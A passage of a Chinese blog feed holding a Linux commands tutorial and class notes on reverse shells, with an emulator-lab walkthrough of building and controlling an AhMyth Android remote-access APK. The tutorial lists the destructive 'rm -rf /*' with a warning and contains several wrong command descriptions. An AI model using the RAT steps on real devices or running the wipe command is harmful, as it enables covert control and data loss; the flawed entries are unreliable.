&lt;li&gt;&lt;h1 id=&quot;HTML5基础：&quot;&gt;&lt;a href=&quot;#HTML5基础：&quot; class=&quot;headerlink&quot; title=&quot;HTML5基础：&quot;&gt;&lt;/a&gt;HTML5基础：&lt;/h1&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;在VS-code中添加拓展，如图所示。&quot;</summary>
      
    
    
    
    
    <category term="1" scheme="http://example.com/tags/1/"/>
    
  </entry>
  
  <entry>
    <title>Linux基本操作指令</title>
    <link href="http://example.com/2023/12/06/linux/"/>
    <id>http://example.com/2023/12/06/linux/</id>
    <published>2023-12-06T03:14:58.391Z</published>
    <updated>2023-12-10T01:31:11.799Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux-常用操作命令大全"><a href="#Linux-常用操作命令大全" class="headerlink" title="Linux 常用操作命令大全"></a>Linux 常用操作命令大全</h1><h2 id="1-1-Linux系统的文件结构"><a href="#1-1-Linux系统的文件结构" class="headerlink" title="1.1 Linux系统的文件结构"></a>1.1 Linux系统的文件结构</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/bin        二进制文件，系统常规命令</span><br><span class="line">/boot       系统启动分区，系统启动时读取的文件</span><br><span class="line">/dev        设备文件</span><br><span class="line">/etc        大多数配置文件</span><br><span class="line">/home       普通用户的家目录</span><br><span class="line">/lib        32位函数库</span><br><span class="line">/lib64      64位库</span><br><span class="line">/media      手动临时挂载点</span><br><span class="line">/mnt        手动临时挂载点</span><br><span class="line">/opt        第三方软件安装位置</span><br><span class="line">/proc       进程信息及硬件信息</span><br><span class="line">/root       临时设备的默认挂载点</span><br><span class="line">/sbin       系统管理命令</span><br><span class="line">/srv        数据</span><br><span class="line">/var        数据</span><br><span class="line">/sys        内核相关信息</span><br><span class="line">/tmp        临时文件</span><br><span class="line">/usr        用户相关设定</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1-2-Linux系统命令行的含义"><a href="#1-2-Linux系统命令行的含义" class="headerlink" title="1.2 Linux系统命令行的含义"></a>1.2 Linux系统命令行的含义</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">示例：root@app00:~# </span><br><span class="line">root    //用户名，root为超级用户</span><br><span class="line">@       //分隔符</span><br><span class="line">app00   //主机名称</span><br><span class="line">~       //当前所在目录，默认用户目录为~，会随着目录切换而变化，例如：（root@app00:/bin# ，当前位置在bin目录下）</span><br><span class="line">#       //表示当前用户是超级用户，普通用户为$，例如：（&quot;yao@app00:/root$&quot; ，表示使用用户&quot;yao&quot;访问/root文件夹）</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="二、基础操作"><a href="#二、基础操作" class="headerlink" title="二、基础操作"></a>二、基础操作</h2><ol><li><h3 id="切换目录（cd）"><a href="#切换目录（cd）" class="headerlink" title="切换目录（cd）"></a>切换目录（cd）</h3></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cd /                 //切换到根目录</span><br><span class="line">cd /bin              //切换到根目录下的bin目录</span><br><span class="line">cd ../               //切换到上一级目录 或者使用命令：cd ..</span><br><span class="line">cd ~                 //切换到home目录</span><br><span class="line">cd -                 //切换到上次访问的目录</span><br><span class="line">cd xx(文件夹名)       //切换到本目录下的名为xx的文件目录，如果目录不存在报错</span><br><span class="line">cd /xxx/xx/x         //可以输入完整的路径，直接切换到目标目录，输入过程中可以使用tab键快速补全</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li><h3 id="查看目录（ls）"><a href="#查看目录（ls）" class="headerlink" title="查看目录（ls）"></a>查看目录（ls）</h3></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls                   //查看当前目录下的所有目录和文件</span><br><span class="line">ls -a                //查看当前目录下的所有目录和文件（包括隐藏的文件）</span><br><span class="line">ls -l                //列表查看当前目录下的所有目录和文件（列表查看，显示更多信息），与命令&quot;ll&quot;效果一样</span><br><span class="line">ls /bin              //查看指定目录下的所有目录和文件 </span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li><h3 id="创建目录（mkdir）"><a href="#创建目录（mkdir）" class="headerlink" title="创建目录（mkdir）"></a>创建目录（mkdir）</h3></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir tools          //在当前目录下创建一个名为tools的目录</span><br><span class="line">mkdir /bin/tools     //在指定目录下创建一个名为tools的目录</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="4"><li><h3 id="删除目录与文件（rm）"><a href="#删除目录与文件（rm）" class="headerlink" title="删除目录与文件（rm）"></a>删除目录与文件（rm）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rm 文件名              //删除当前目录下的文件</span><br><span class="line">rm -f 文件名           //删除当前目录的的文件（不询问）</span><br><span class="line">rm -r 文件夹名         //递归删除当前目录下此名的目录</span><br><span class="line">rm -rf 文件夹名        //递归删除当前目录下此名的目录（不询问）</span><br><span class="line">rm -rf *              //将当前目录下的所有目录和文件全部删除</span><br><span class="line">rm -rf /*             //将根目录下的所有文件全部删除【慎用！相当于格式化系统】</span><br><span class="line">   </span><br></pre></td></tr></table></figure></li><li><h3 id="修改目录（mv）"><a href="#修改目录（mv）" class="headerlink" title="修改目录（mv）"></a>修改目录（mv）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mv 当前目录名 新目录名        //修改目录名，同样适用与文件操作</span><br><span class="line">mv /usr/tmp/tool /opt       //将/usr/tmp目录下的tool目录剪切到 /opt目录下面</span><br><span class="line">mv -r /usr/tmp/tool /opt    //递归剪切目录中所有文件和文件夹</span><br><span class="line">   </span><br></pre></td></tr></table></figure></li><li><h3 id="拷贝目录（cp）"><a href="#拷贝目录（cp）" class="headerlink" title="拷贝目录（cp）"></a>拷贝目录（cp）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/tmp/tool /opt       //将/usr/tmp目录下的tool目录复制到 /opt目录下面</span><br><span class="line">cp -r /usr/tmp/tool /opt    //递归剪复制目录中所有文件和文件夹</span><br><span class="line">   </span><br></pre></td></tr></table></figure></li><li><h3 id="搜索目录（find）"><a href="#搜索目录（find）" class="headerlink" title="搜索目录（find）"></a>搜索目录（find）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/tmp/tool /opt       //将/usr/tmp目录下的tool目录复制到 /opt目录下面</span><br><span class="line">cp -r /usr/tmp/tool /opt    //递归剪复制目录中所有文件和文件夹</span><br><span class="line">   </span><br></pre></td></tr></table></figure></li><li><h3 id="查看当前目录（pwd）"><a href="#查看当前目录（pwd）" class="headerlink" title="查看当前目录（pwd）"></a>查看当前目录（pwd）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd                         //显示当前位置路径</span><br></pre></td></tr></table></figure></li></ol><h2 id="3-文件操作"><a href="#3-文件操作" class="headerlink" title="3. 文件操作"></a>3. 文件操作</h2><ol><li><h3 id="新增文件（touch）"><a href="#新增文件（touch）" class="headerlink" title="新增文件（touch）"></a>新增文件（touch）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch  a.txt         //在当前目录下创建名为a的txt文件（文件不存在），如果文件存在，将文件时间属性修改为当前系统时间</span><br><span class="line">   </span><br></pre></td></tr></table></figure></li><li><h3 id="删除文件（rm）"><a href="#删除文件（rm）" class="headerlink" title="删除文件（rm）"></a>删除文件（rm）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm 文件名              //删除当前目录下的文件</span><br><span class="line">rm -f 文件名           //删除当前目录的的文件（不询问）</span><br></pre></td></tr></table></figure></li><li><h3 id="编辑文件（vi、vim）"><a href="#编辑文件（vi、vim）" class="headerlink" title="编辑文件（vi、vim）"></a>编辑文件（vi、vim）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">vi 文件名              //打开需要编辑的文件</span><br><span class="line">--进入后，操作界面有三种模式：命令模式（command mode）、插入模式（Insert mode）和底行模式（last line mode）</span><br><span class="line">命令模式</span><br><span class="line">-刚进入文件就是命令模式，通过方向键控制光标位置，</span><br><span class="line">-使用命令&quot;dd&quot;删除当前整行</span><br><span class="line">-使用命令&quot;/字段&quot;进行查找</span><br><span class="line">-按&quot;i&quot;在光标所在字符前开始插入</span><br><span class="line">-按&quot;a&quot;在光标所在字符后开始插入</span><br><span class="line">-按&quot;o&quot;在光标所在行的下面另起一新行插入</span><br><span class="line">-按&quot;：&quot;进入底行模式</span><br><span class="line">插入模式</span><br><span class="line">-此时可以对文件内容进行编辑，左下角会显示 &quot;-- 插入 --&quot;&quot;</span><br><span class="line">-按&quot;ESC&quot;进入底行模式</span><br><span class="line">底行模式</span><br><span class="line">-退出编辑：      :q</span><br><span class="line">-强制退出：      :q!</span><br><span class="line">-保存并退出：    :wq</span><br><span class="line">## 操作步骤示例 ##</span><br><span class="line">1.保存文件：按&quot;ESC&quot; -&gt; 输入&quot;:&quot; -&gt; 输入&quot;wq&quot;,回车     //保存并退出编辑</span><br><span class="line">2.取消操作：按&quot;ESC&quot; -&gt; 输入&quot;:&quot; -&gt; 输入&quot;q!&quot;,回车     //撤销本次修改并退出编辑</span><br><span class="line">## 补充 ##</span><br><span class="line">vim +10 filename.txt                   //打开文件并跳到第10行</span><br><span class="line">vim -R /etc/passwd                     //以只读模式打开文件</span><br><span class="line">   </span><br></pre></td></tr></table></figure></li><li><h3 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat a.txt          //查看文件最后一屏内容</span><br><span class="line">less a.txt         //PgUp向上翻页，PgDn向下翻页，&quot;q&quot;退出查看</span><br><span class="line">more a.txt         //显示百分比，回车查看下一行，空格查看下一页，&quot;q&quot;退出查看</span><br><span class="line">tail -100 a.txt    //查看文件的后100行，&quot;Ctrl+C&quot;退出查看</span><br><span class="line">   </span><br></pre></td></tr></table></figure></li></ol><h2 id="4-文件权限"><a href="#4-文件权限" class="headerlink" title="4.文件权限"></a>4.文件权限</h2><ol><li><h3 id="权限说明"><a href="#权限说明" class="headerlink" title="权限说明"></a>权限说明</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">文件权限简介：&#x27;r&#x27; 代表可读（4），&#x27;w&#x27; 代表可写（2），&#x27;x&#x27; 代表执行权限（1），括号内代表&quot;8421法&quot;</span><br><span class="line">##文件权限信息示例：-rwxrw-r--</span><br><span class="line">-第一位：&#x27;-&#x27;就代表是文件，&#x27;d&#x27;代表是文件夹</span><br><span class="line">-第一组三位：拥有者的权限</span><br><span class="line">-第二组三位：拥有者所在的组，组员的权限</span><br><span class="line">-第三组三位：代表的是其他用户的权限</span><br><span class="line">   </span><br></pre></td></tr></table></figure></li><li><h3 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h3></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">普通授权    chmod +x a.txt    </span><br><span class="line">8421法     chmod 777 a.txt     //1+2+4=7，&quot;7&quot;说明授予所有权限</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="5"><li><h2 id="打包与解压"><a href="#打包与解压" class="headerlink" title="打包与解压"></a>打包与解压</h2></li><li><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.zip、.rar        //windows系统中压缩文件的扩展名</span><br><span class="line">.tar              //Linux中打包文件的扩展名</span><br><span class="line">.gz               //Linux中压缩文件的扩展名</span><br><span class="line">.tar.gz           //Linux中打包并压缩文件的扩展名</span><br><span class="line">   </span><br></pre></td></tr></table></figure></li><li><h3 id="打包文件"><a href="#打包文件" class="headerlink" title="打包文件"></a>打包文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf 打包压缩后的文件名 要打包的文件</span><br><span class="line">参数说明：z：调用gzip压缩命令进行压缩; c：打包文件; v：显示运行过程; f：指定文件名;</span><br><span class="line">示例：</span><br><span class="line">tar -zcvf a.tar file1 file2,...      //多个文件压缩打包</span><br><span class="line">   </span><br></pre></td></tr></table></figure></li><li><h3 id="解压文件"><a href="#解压文件" class="headerlink" title="解压文件"></a>解压文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf a.tar                      //解包至当前目录</span><br><span class="line">tar -zxvf a.tar -C /usr------        //指定解压的位置</span><br><span class="line">unzip test.zip             //解压*.zip文件 </span><br><span class="line">unzip -l test.zip          //查看*.zip文件的内容 </span><br><span class="line">   </span><br></pre></td></tr></table></figure></li><li><h2 id="其他常用命令"><a href="#其他常用命令" class="headerlink" title="其他常用命令"></a>其他常用命令</h2></li><li><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">find . -name &quot;*.c&quot;     //将目前目录及其子目录下所有延伸档名是 c 的文件列出来</span><br><span class="line">find . -type f         //将目前目录其其下子目录中所有一般文件列出</span><br><span class="line">find . -ctime -20      //将目前目录及其子目录下所有最近 20 天内更新过的文件列出</span><br><span class="line">find /var/log -type f -mtime +7 -ok rm &#123;&#125; \;     //查找/var/log目录中更改时间在7日以前的普通文件，并在删除之前询问它们</span><br><span class="line">find . -type f -perm 644 -exec ls -l &#123;&#125; \;       //查找前目录中文件属主具有读、写权限，并且文件所属组的用户和其他用户具有读权限的文件</span><br><span class="line">find / -type f -size 0 -exec ls -l &#123;&#125; \;         //为了查找系统中所有文件长度为0的普通文件，并列出它们的完整路径</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li><h3 id="whereis"><a href="#whereis" class="headerlink" title="whereis"></a>whereis</h3></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis ls             //将和ls文件相关的文件都查找出来</span><br></pre></td></tr></table></figure><p>3.### which</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">说明：which指令会在环境变量$PATH设置的目录里查找符合条件的文件。</span><br><span class="line">which bash             //查看指令&quot;bash&quot;的绝对路径</span><br></pre></td></tr></table></figure><ol start="4"><li><h3 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h3></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">说明：sudo命令以系统管理者的身份执行指令，也就是说，经由 sudo 所执行的指令就好像是 root 亲自执行。需要输入自己账户密码。</span><br><span class="line">使用权限：在 /etc/sudoers 中有出现的使用者</span><br><span class="line">sudo -l                              //列出目前的权限</span><br><span class="line">$ sudo -u yao vi ~www/index.html    //以 yao 用户身份编辑  home 目录下www目录中的 index.html 文件</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="5"><li><h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep -i &quot;the&quot; demo_file              //在文件中查找字符串(不区分大小写)</span><br><span class="line">grep -A 3 -i &quot;example&quot; demo_text     //输出成功匹配的行，以及该行之后的三行</span><br><span class="line">grep -r &quot;ramesh&quot; *                   //在一个文件夹中递归查询包含指定字符串的文件</span><br></pre></td></tr></table></figure><ol start="6"><li><h3 id="service"><a href="#service" class="headerlink" title="service"></a>service</h3></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">说明：service命令用于运行System V init脚本，这些脚本一般位于/etc/init.d文件下，这个命令可以直接运行这个文件夹里面的脚本，而不用加上路径</span><br><span class="line">service ssh status      //查看服务状态 </span><br><span class="line">service --status-all    //查看所有服务状态 </span><br><span class="line">service ssh restart     //重启服务 </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linux-常用操作命令大全&quot;&gt;&lt;a href=&quot;#Linux-常用操作命令大全&quot; class=&quot;headerlink&quot; title=&quot;Linux 常用操作命令大全&quot;&gt;&lt;/a&gt;Linux 常用操作命令大全&lt;/h1&gt;&lt;h2 id=&quot;1-1-Linux系统的文件结构&quot;</summary>
      
    
    
    
    
    <category term="1" scheme="http://example.com/tags/1/"/>
    
  </entry>
  
  <entry>
    <title>12.4（远程控制原理，安卓远程控制，网络基础知识）</title>
    <link href="http://example.com/2023/12/06/12.4%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E5%8E%9F%E7%90%86/"/>
    <id>http://example.com/2023/12/06/12.4%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E5%8E%9F%E7%90%86/</id>
    <published>2023-12-06T02:19:54.644Z</published>
    <updated>2023-12-05T09:09:21.153Z</updated>
    
    <content type="html"><![CDATA[<ol><li><h1 id="远程控制原理"><a href="#远程控制原理" class="headerlink" title="远程控制原理"></a>远程控制原理</h1></li></ol><h2 id="分为反弹shell和正向shell，如我们此次实验的远程正是用的反弹shell原理。"><a href="#分为反弹shell和正向shell，如我们此次实验的远程正是用的反弹shell原理。" class="headerlink" title="分为反弹shell和正向shell，如我们此次实验的远程正是用的反弹shell原理。"></a>分为反弹shell和正向shell，如我们此次实验的远程正是用的反弹shell原理。</h2><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204185010572.png" alt="image-20231204185010572"></p><blockquote><h3 id="反弹shell：反弹shell的本质是客户端和服务端角色的反转，如制作一个木马程序，程序包含shell端的ip以及shell端设置的端口，当有clien（客户端）访问此端口则能对其进行控制"><a href="#反弹shell：反弹shell的本质是客户端和服务端角色的反转，如制作一个木马程序，程序包含shell端的ip以及shell端设置的端口，当有clien（客户端）访问此端口则能对其进行控制" class="headerlink" title="反弹shell：反弹shell的本质是客户端和服务端角色的反转，如制作一个木马程序，程序包含shell端的ip以及shell端设置的端口，当有clien（客户端）访问此端口则能对其进行控制"></a>反弹shell：反弹shell的本质是<strong>客户端和服务端角色的反转</strong>，如制作一个木马程序，程序包含shell端的ip以及shell端设置的端口，当有clien（客户端）访问此端口则能对其进行控制</h3><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204184048666.png" alt="image-20231204184048666"></p><h3 id="正向shell：控制端主动发起连接去连接被控制端。在实战中，大多数采用反向shell，因为正向shell有很多因素导致连接失败，-比如说硬件设备有防火墙，入侵防御系统等，还有网站防火墙，端口占用，权限不足等场景，特别是硬件设备如果你正向连接被防火墙拦截导致打草惊蛇，后期攻击相当繁琐。"><a href="#正向shell：控制端主动发起连接去连接被控制端。在实战中，大多数采用反向shell，因为正向shell有很多因素导致连接失败，-比如说硬件设备有防火墙，入侵防御系统等，还有网站防火墙，端口占用，权限不足等场景，特别是硬件设备如果你正向连接被防火墙拦截导致打草惊蛇，后期攻击相当繁琐。" class="headerlink" title="正向shell：控制端主动发起连接去连接被控制端。在实战中，大多数采用反向shell，因为正向shell有很多因素导致连接失败， 比如说硬件设备有防火墙，入侵防御系统等，还有网站防火墙，端口占用，权限不足等场景，特别是硬件设备如果你正向连接被防火墙拦截导致打草惊蛇，后期攻击相当繁琐。"></a>正向shell：控制端主动发起连接去连接被控制端。在实战中，大多数采用反向shell，因为正向shell有很多因素导致连接失败， 比如说硬件设备有防火墙，入侵防御系统等，还有网站防火墙，端口占用，权限不足等场景，特别是硬件设备如果你正向连接被防火墙拦截导致打草惊蛇，后期攻击相当繁琐。</h3><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204184357918.png" alt="image-20231204184357918"></p></blockquote><ol start="2"><li><h1 id="AhMyth-Win64安卓远控"><a href="#AhMyth-Win64安卓远控" class="headerlink" title="AhMyth_Win64安卓远控"></a>AhMyth_Win64安卓远控</h1></li></ol><h2 id="前期准备："><a href="#前期准备：" class="headerlink" title="前期准备："></a>前期准备：</h2><blockquote><h3 id="下载AhMyth-Win64"><a href="#下载AhMyth-Win64" class="headerlink" title="下载AhMyth_Win64"></a>下载AhMyth_Win64</h3><h3 id="下载mumu模拟器（下载版本6）"><a href="#下载mumu模拟器（下载版本6）" class="headerlink" title="下载mumu模拟器（下载版本6）"></a>下载mumu模拟器（下载版本6）</h3><h3 id="如报错下载”Everything”，搜索”java-exe”-如搜不到则重新搭建“java”环境，如有“bin”目录下的“java-exe”，则在环境变量添加即可"><a href="#如报错下载”Everything”，搜索”java-exe”-如搜不到则重新搭建“java”环境，如有“bin”目录下的“java-exe”，则在环境变量添加即可" class="headerlink" title="如报错下载”Everything”，搜索”java.exe”,如搜不到则重新搭建“java”环境，如有“bin”目录下的“java.exe”，则在环境变量添加即可"></a>如报错下载”Everything”，搜索”java.exe”,如搜不到则重新搭建“java”环境，如有“bin”目录下的“java.exe”，则在环境变量添加即可</h3><p> <img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204145347583.png" alt="image-20231204145347583"></p><h3 id="在环境变量搭建java环境：首先打开环境变量，在“系统变量”中找到“Path”打开"><a href="#在环境变量搭建java环境：首先打开环境变量，在“系统变量”中找到“Path”打开" class="headerlink" title="在环境变量搭建java环境：首先打开环境变量，在“系统变量”中找到“Path”打开"></a>在环境变量搭建java环境：首先打开环境变量，在“系统变量”中找到“Path”打开</h3><p> <img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204145516840.png" alt="image-20231204145516840"></p><h3 id="点击“新建”，添加查找到在“bin”目录下的“java-exe”，点击确定即可"><a href="#点击“新建”，添加查找到在“bin”目录下的“java-exe”，点击确定即可" class="headerlink" title="点击“新建”，添加查找到在“bin”目录下的“java.exe”，点击确定即可"></a>点击“新建”，添加查找到在“bin”目录下的“java.exe”，点击确定即可</h3><p> <img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204145620871.png" alt="image-20231204145620871"></p><h3 id="打开“CMD”-输入以下代码，如图所示即为成功："><a href="#打开“CMD”-输入以下代码，如图所示即为成功：" class="headerlink" title="打开“CMD”,输入以下代码，如图所示即为成功："></a>打开“CMD”,输入以下代码，如图所示即为成功：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -version<span class="comment">#查看java版本</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204145821062.png" alt="image-20231204145821062"></p></blockquote><h2 id="1-打开AhMyth-Win64，点击APK-Builder"><a href="#1-打开AhMyth-Win64，点击APK-Builder" class="headerlink" title="1.打开AhMyth_Win64，点击APK Builder"></a>1.打开AhMyth_Win64，点击APK Builder</h2><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204150409759.png" alt="image-20231204150409759"></p><h2 id="2-在“Source-IP”框中输入自己的ip，随后点击生成"><a href="#2-在“Source-IP”框中输入自己的ip，随后点击生成" class="headerlink" title="2.在“Source IP”框中输入自己的ip，随后点击生成"></a>2.在“Source IP”框中输入自己的ip，随后点击生成</h2><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204150532936.png" alt="image-20231204150532936"></p><h2 id="3-生成之后，则会在下面输出框，显示生成的apk地址，根据地址找到所生成的apk。"><a href="#3-生成之后，则会在下面输出框，显示生成的apk地址，根据地址找到所生成的apk。" class="headerlink" title="3.生成之后，则会在下面输出框，显示生成的apk地址，根据地址找到所生成的apk。"></a>3.生成之后，则会在下面输出框，显示生成的apk地址，根据地址找到所生成的apk。</h2><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204150656080.png" alt="image-20231204150656080"></p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204150724519.png" alt="image-20231204150724519"></p><h2 id="4-打开“MuMu模拟器”，点击安装"><a href="#4-打开“MuMu模拟器”，点击安装" class="headerlink" title="4.打开“MuMu模拟器”，点击安装"></a>4.打开“MuMu模拟器”，点击安装</h2><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204150912415.png" alt="image-20231204150912415"></p><h2 id="5-找到刚刚生成的apk，打开即可"><a href="#5-找到刚刚生成的apk，打开即可" class="headerlink" title="5.找到刚刚生成的apk，打开即可"></a>5.找到刚刚生成的apk，打开即可</h2><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204150946393.png" alt="image-20231204150946393"></p><h2 id="6-打开生成的apk，则与主机连接。然后则打开“AhMyth-Win64”软件，点击“Listen”即可。"><a href="#6-打开生成的apk，则与主机连接。然后则打开“AhMyth-Win64”软件，点击“Listen”即可。" class="headerlink" title="6.打开生成的apk，则与主机连接。然后则打开“AhMyth_Win64”软件，点击“Listen”即可。"></a>6.打开生成的apk，则与主机连接。然后则打开“AhMyth_Win64”软件，点击“Listen”即可。</h2><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204151310162.png" alt="image-20231204151310162"></p><h2 id="7-双击“Open-The-Lab”，则能得到控制界面。则在此界面能进行相应控制。"><a href="#7-双击“Open-The-Lab”，则能得到控制界面。则在此界面能进行相应控制。" class="headerlink" title="7.双击“Open The Lab”，则能得到控制界面。则在此界面能进行相应控制。"></a>7.双击“Open The Lab”，则能得到控制界面。则在此界面能进行相应控制。</h2><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204151353850.png" alt="image-20231204151353850"></p><ol start="3"><li><h1 id="网络基础知识"><a href="#网络基础知识" class="headerlink" title="网络基础知识"></a>网络基础知识</h1></li><li><h2 id="以太网适配器："><a href="#以太网适配器：" class="headerlink" title="以太网适配器："></a>以太网适配器：</h2></li></ol><p>一般都是有线插槽。LAN （局域网接口），局域网接口主要是用于路由器与局域网进行连接。</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204185320903.png" alt="image-20231204185320903"></p><ol start="2"><li><h2 id="VMware-Network-Adapter-VMnet8-指的是虚拟机网卡。"><a href="#VMware-Network-Adapter-VMnet8-指的是虚拟机网卡。" 